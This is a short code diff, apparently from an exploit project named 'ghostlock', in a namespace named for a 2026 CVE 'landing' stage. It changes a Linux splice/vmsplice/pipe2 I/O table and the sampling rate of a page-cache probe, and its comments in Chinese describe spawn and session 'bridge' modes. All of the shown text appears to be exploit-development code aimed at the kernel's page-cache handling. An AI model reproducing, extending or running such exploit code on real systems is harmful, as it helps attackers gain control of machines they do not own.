@@ -162,7 +162,8 @@ namespace ghostlock::backend::cve_2026_43284::landing {
     SpliceIoOps real_splice_io() noexcept {
 #if defined(__linux__)
         return SpliceIoOps{&real_pipe2, &real_splice, &real_vmsplice,
-                           &real_send_datagram, &real_read_at, &real_close_fd};
+                           &real_send_datagram, &real_read_at, &real_close_fd,
+                           kBridgeModeDefault};
 #else
         return SpliceIoOps{};
 #endif
@@ -268,7 +269,12 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                  * 前 4 字节。每块都做等于每块多一次 helper exec —— 那一次读不参与组帧，只供对照，
                  * 所以它按 512 字节的粒度抽样；管道里的页仍由上面那一次 splice16 放进来的页缓存
                  * 提供，**页身份不变**（本文件的页来源语义没有动过）。 */
-                if ((offset % kProbeEveryBytes) == 0U) {
+                /* 探针的粒度随桥形态：spawn 下一次读是一次 fork（所以按 512 字节抽样）；session 下一次
+                 *  读只值一次 IPC，所以每块都能读 —— 这是唯一由 SpliceIoOps::bridge_mode 改变的行为，
+                 *  默认 spawn 时与抽样落地之后的代码逐字节等价。 */
+                const bool probe_now = io_.bridge_mode == kBridgeModeSession ||
+                                       (offset % kProbeEveryBytes) == 0U;
+                if (probe_now) {
                     std::uint8_t probe[kBlockBytes] = {};
                     const long probed = old_page_.available()
                                        ? old_page_.read16(old_page_.ctx, offset, probe)
